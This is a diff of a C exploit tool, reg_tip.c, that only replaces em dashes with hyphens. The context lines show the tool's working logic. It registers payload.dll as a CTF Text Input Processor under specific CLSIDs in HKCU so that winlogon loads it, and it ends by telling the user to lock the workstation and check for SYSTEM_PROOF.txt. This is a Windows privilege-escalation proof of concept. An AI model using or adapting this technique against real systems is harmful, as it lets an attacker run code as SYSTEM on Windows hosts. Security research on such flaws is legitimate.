@@ -1,5 +1,5 @@
 /*
- * reg_tip.c  —  Register payload.dll as a CTF Text Input Processor (TIP)
+ * reg_tip.c  -  Register payload.dll as a CTF Text Input Processor (TIP)
  *
  * When winlogon processes the Winlogon-desktop CTF session it reads TIP
  * registrations from the user's HKCU and loads them. If it loads them in
@@ -49,7 +49,7 @@ int main(int argc, char **argv) {
 
     printf("[*] Registering CTF TIP: %s\n\n", dllPath);
 
-    /* The two GUIDs winlogon wrote into our section —
+    /* The two GUIDs winlogon wrote into our section -
        try registering both as TIPs so one of them matches. */
     const wchar_t *clsids[] = {
         L"{34745c63-b2f0-4784-8b67-5e12c8701a31}",  /* GUID1 from section */
@@ -68,7 +68,7 @@ int main(int argc, char **argv) {
         const wchar_t *clsid = clsids[i];
         wchar_t path[512];
 
-        /* InProcServer32 — DLL path */
+        /* InProcServer32 - DLL path */
         swprintf(path, 511,
             L"SOFTWARE\\Classes\\CLSID\\%ls\\InProcServer32", clsid);
         if (WriteRegSZ(HKEY_CURRENT_USER, path, NULL, dllW) &&
@@ -100,7 +100,7 @@ int main(int argc, char **argv) {
         if (WriteRegSZ(HKEY_LOCAL_MACHINE, path, NULL, dllW))
             printf("[+] HKLM CLSID\\%ls registered\n", clsids[i]);
         else
-            printf("[-] HKLM CLSID\\%ls — access denied (expected)\n", clsids[i]);
+            printf("[-] HKLM CLSID\\%ls - access denied (expected)\n", clsids[i]);
     }
 
     printf("\n[*] Done. Now lock the workstation and check for SYSTEM_PROOF.txt\n");
